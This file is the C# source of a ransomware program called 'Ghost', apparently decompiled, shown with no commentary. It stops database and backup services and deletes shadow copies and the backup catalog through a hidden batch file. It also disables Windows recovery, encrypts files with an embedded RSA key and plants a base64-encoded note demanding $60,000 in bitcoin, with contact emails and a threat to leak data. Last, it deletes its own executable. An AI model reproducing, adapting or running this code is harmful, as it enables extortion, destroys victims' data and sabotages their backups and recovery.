using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Text;
using Crypt3r;
using FileUtils;

namespace Ghost;

internal class Program
{
	private static string README = "HOW_CAN_GET_FILES_BACK";

	private static string READMERTFFILE = README + ".rtf";

	private static string READMETXTFILE = README + ".txt";

	private static string MsgTpl = "PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKWU9VUiBJRCA6IHtfX0lEX199CgorKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrCgpPT1BTISBZT1VSIElNUE9SVEFOVCBGMUxFUyBIQVMgQkVFTiBFTkM6KFJZUFRFRCAhISEKRE8gTk9UIFdPUlJZISBGSUxFUyBBUkUgU0FGRSEgSlVTVCBNT0RJRklFRCBPTkxZLiAoUlNBICsgQUVTKQoKKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKwoKQU5ZIEFUVEVNUFQgVE8gUkVTVE9SRSBZT1VSIEZJTEVTIFdJVEggVEhJUkQtUEFSVFkKU09GVFdBUkUgV0lMTCBQRVJNRU5BTlRMWSBERVNUT1JZIFlPVVIgRklMRSAhISEKCk5PIFNPRlRXQVJFIEFWQUxJQUJMRSBPTiBJTlRFUk5FVCBDQU4gSEVMUCBZT1UhCk9OTFkgV0UgSEFWRSBTT0xVVElPTiBUTyBZT1VSIFBST0JMRU0uCgpXRSBPTkxZIFNFRUsgTU9ORVkgQU5EIERPIE5PVCBXQU5UIFRPIERBTUFHRSBZT1VSIFJFUFVUQVRJT04uCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpZT1UgTkVFRCBUTyBQQVkgX19CVENfXyBUTyBPVVQgQUNDT1VOVCwgQUZURVIgVEhFIFBBWU1FTlQKSVMgQ09ORklSTUVELCBXRSBXSUxMIElNTUVESUFURUxZIERFTEVURSBBTEwgT0YgWU9VUiBGSUxFUyBPTgpPVVIgU0VSVkVSIEFORCBTRU5EIFRIRSBERUNSWVBUSU9OIFBST0dSQU0gQU5EIFBSSVZBVEUgS0VZIFRPIFlPVS4KCklGIFlPVSBERUNJREUgVE8gTk9UIFBBWSBPUiBUSEVSRSBJUyBOTyBQQVlNRU5UIFdJVEhJTiA3LURBWVMsCldFIFdJTEwgREVMRVRFIFRIRSBERUNSWVBUSU9OIEtFWSBGUk9NIE9VUiBEQVRBQkFTRSwgQU5EIFNPTUUgCk9GIFlPVVIgSU1QT1JUQU5UIERBVEEgV0lMTCBCRSBSRUxFQVNFIFRPIFBVQkxJQyBPUiBSRS1TRUxMIQoKRE8gTk9UIEtOT1cgSE9XIFRPIEJVWSBCSVRDT0lOID8gSlVTVCBHT09HTEUgSVQgOikKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCkNPTlRBQ1QgVVMgRk9SIFBBWU1FTlQgQ09ORklSTVRJT04gQU5EIEdFVCBERUNSWVBUSU9OIFNPRlRXQVJFIDoKCl9fTUFJTDFfXwoKX19NQUlMMl9fIChJRiBOTyBBTlNXRVIgV0lUSElOIDI0LUhPVVJTKQoKPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ==";

	private static readonly string suffix = ".jpghosts";

	private static readonly string pubKey = "<RSAKeyValue><Modulus>4zqh1TGsBbD1hacypa5tYfWyIWdCptzPIWjux4Xh4RjbfWmJ80xOvGBXEuJTdXWLKJNwhmBY+l3u5D212MS1MlKPAMihS0eZ35+Ty/MsAhWfcgubHGjx6SzNfP/NofeP67lYdCuj5WE7KacjoamnQ1snt3zyF9FuFYlFsq0qpsUoK1qgoffB9fXTb99DVVizgiQxrKuNQH6BmrL4xIqz7/HAInq2X77AZYAEQQRjL3Qcg/LhBEN1u7efb3YLYlcB0KSXG0l8fsXeR1ePvmJwx+WPjNrByu5OrS6dU/mRrPWiskEeCIWS78HpafFpJ903BnV7dxr9LW7KYZN95vBLNbv+Kp/RKOiBcxrDNUIo1qF7KyzEFVwZ8VkODKTN6nF6LR5tu847DoQR0Igtw9Gf/cV4ZkYFM0MJ0ELfltsirAPbfyOAYYfPyh2ZRXjxLb7qx95X46VcX6oote+SS+kDZ7bTnsmh2Ui1ehTnwuEAHoUsP5xEiqplPimKhCNbElHKjHiVEUj69xS8daOqydKtpXFpscXUD7B55hapg76d8HkdGKzxparyDlz57eGdv/flES6OeFzb25AIflaTe+b9cJhC1Y0GGqwNO0wOqlW05mPGdvHrI5JnPkf7oaehlAdtKFo/hXayy4AoO7EgIwgVQU1681ZUKNZTaU4pJHfB3gW0k97LObrJNBc1o74cRZ8HqyUEgoW4lXOmd+gq6rTZPQaUy2YuPrnNhFCe1nyt1ItRLAe69giXfC74q8gqr0pFmpjI7+wLh/3lKEMZMPpKqSY2sLwAmFxpdrb/7a4VjeknzePDyMcb5Pt+0lZandm6m1uDPY/AcptlZxBaXC6CK/rgooFzMIVyHB6Zedut3lAKiBY1zd+0mAK4sJx6KK/5/E5xAAybCeQ4rhV5C8fGYZoQ+ZA3OIZohoJVWAOg/Nx8bVZwTDdi2uvqX9pASiXnZDBMkL+hU+L4aJlq4GYResNhTPp/gDeWk19NDAyedxw4Re3isTZ9LwcIH8WnVXKSeI+koYD3l4Q1hRLfIKy73cIjB6LMQJm7u+m/D2kJ8jsWjfGIHPuLc/XcAFo3Bl5gAthw7P2qmkLB6jCIzcZQ35GFdkQv4N9sUirYKNI9CTAGFQ9Mr116DxpyqAJDh7h7gcGLKwzxjCzljsbv08wWxzLoxgj9prFISZJgFzvKnus9pR8IhccAI4CMPYUXOp0dn2BWB4gMq3AMvFAdnJ8fughq0avbthdHX0Hlqn7uOqSkg6BVCgaS/w6NnKHOgctnKWeCUtzZql4EfPEtEa+fQXNRSPUJQzNP1hYccbneqUo5dqdr1cIf3s1JuT3fFzhfSsgGzwukbbp+Y3h39PABSQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static string mail1 = "shadowghosts@tutanota.com ";

	private static string mail2 = "fortihooks@protonmail.com";

	private static string btcc = "$60,000";

	private static string rid = "bf299e34-b03e-4397-a2bc-4256d830715a";

	private static readonly List<string> cryFilter = new List<string>
	{
		".exe", ".dll", ".lib", ".ini", ".sys", ".ax", ".acm", ".bin", ".log", ".mui",
		".msi", ".pyc", ".tlb", ".rll"
	};

	private static Cring cring;

	private static void Main(string[] args)
	{
		if (args.Length < 1)
		{
			Console.WriteLine("Something is Wrong :(");
			return;
		}
		cring = new Cring(cryFilter, pubKey, suffix, README);
		if (args.Length == 2 && args[1] == "v")
		{
			cring.verbose = true;
		}
		StopSVC();
		if ("rsa".Equals(args[0]))
		{
			RemoveShadow();
			WriteDriveFiles();
			cring.CryFiles();
		}
		else
		{
			PathType pathType = PathChecker.GetPathType(args[0]);
			if (pathType == PathType.Directory)
			{
				cring.CryFiles(args[0]);
			}
			else
			{
				if (pathType != PathType.File)
				{
					Console.WriteLine("What The Fuck >_<");
					return;
				}
				cring.CryFile(args[0]);
			}
		}
		WriteDesktopFiles();
		Console.WriteLine("Well Done :)");
		TestForKillMyself();
	}

	public static void StopSVC()
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Invalid comparison between Unknown and I4
		ServiceController[] services = ServiceController.GetServices();
		foreach (ServiceController val in services)
		{
			if ((val.get_ServiceName().ToLower().Contains("sql") || val.get_ServiceName().ToLower().StartsWith("oracle") || val.get_ServiceName().ToLower().StartsWith("veeam") || val.get_ServiceName().ToLower().StartsWith("backup") || val.get_ServiceName().ToLower().StartsWith("Acronis") || val.get_ServiceName().ToLower().StartsWith("msexchange")) && (int)val.get_Status() == 4)
			{
				try
				{
					val.Stop();
				}
				catch (Exception e)
				{
					cring.HandleError(e);
				}
			}
		}
	}

	private static void WriteDriveFiles()
	{
		List<string> list = new List<string>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady)
			{
				list.Add(driveInfo.Name);
			}
		}
		foreach (string item in list)
		{
			WriteContactFile(item);
		}
	}

	private static void WriteDesktopFiles()
	{
		string environmentVariable = Environment.GetEnvironmentVariable("systemdrive");
		string[] array = null;
		try
		{
			array = Directory.GetDirectories(environmentVariable + "\\Users", "*", SearchOption.TopDirectoryOnly);
		}
		catch
		{
		}
		if (array == null)
		{
			try
			{
				array = Directory.GetDirectories(environmentVariable + "\\Documents and Settings", "*", SearchOption.TopDirectoryOnly);
			}
			catch
			{
			}
		}
		List<string> list = new List<string>();
		if (array != null && array.Length != 0)
		{
			string[] array2 = array;
			foreach (string text in array2)
			{
				string[] array3 = text.Split(new char[1] { '\\' });
				if (!array3[^1].ToLower().StartsWith("default") && !array3[^1].ToLower().StartsWith("mssql") && !array3[^1].ToLower().StartsWith("temp"))
				{
					list.Add(text + "\\Desktop\\");
				}
			}
		}
		else
		{
			list.Add(environmentVariable + "\\Users\\Administrator\\Desktop");
			list.Add(environmentVariable + "\\Users\\Public\\Desktop");
			list.Add(environmentVariable + "\\Users\\All Users\\Desktop");
			list.Add(environmentVariable + "\\Documents and Settings\\Administrator\\Desktop");
			list.Add(environmentVariable + "\\Documents and Settings\\All Users\\Desktop");
		}
		foreach (string item in list)
		{
			WriteContactFile(item);
		}
	}

	private static void WriteContactFile(string path)
	{
		string text = path + READMERTFFILE;
		string text2 = path + READMETXTFILE;
		string @string = Encoding.UTF8.GetString(Convert.FromBase64String(MsgTpl));
		@string = @string.Replace("__ID__", rid).Replace("__BTC__", btcc).Replace("__MAIL1__", mail1)
			.Replace("__MAIL2__", mail2);
		try
		{
			File.WriteAllText(text, @string);
			Console.WriteLine("[+] Generate contact file {0} successfully.", text);
		}
		catch
		{
			Console.WriteLine("[-] Generate contact file {0} failed!", text);
		}
		try
		{
			File.WriteAllText(text2, @string);
			Console.WriteLine("[+] Generate contact file {0} successfully.", text2);
		}
		catch
		{
			Console.WriteLine("[-] Generate contact file {0} failed!", text2);
		}
	}

	public static void RemoveShadow()
	{
		string contents = "@echo off\r\n                           wmic shadowcopy delete\r\n                           bcdedit /set {default} bootstatuspolicy ignoreallfailures\r\n                           bcdedit /set {default} recoveryenabled no\r\n                           wbadmin delete catalog -quiet";
		File.WriteAllText("CMS.bat", contents);
		Process.Start(new ProcessStartInfo
		{
			FileName = "CMS.bat",
			Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"",
			WindowStyle = ProcessWindowStyle.Hidden
		});
		Console.WriteLine("[+] Delete Shadows Finished.");
	}

	public static void TestForKillMyself()
	{
		string contents = "@echo off\r\n                           :tryagain\r\n                           del %1\r\n                           if exist %1 goto tryagain\r\n                           del %0";
		File.WriteAllText("killme.bat", contents);
		Process.Start(new ProcessStartInfo
		{
			FileName = "killme.bat",
			Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"",
			WindowStyle = ProcessWindowStyle.Hidden
		});
	}
}
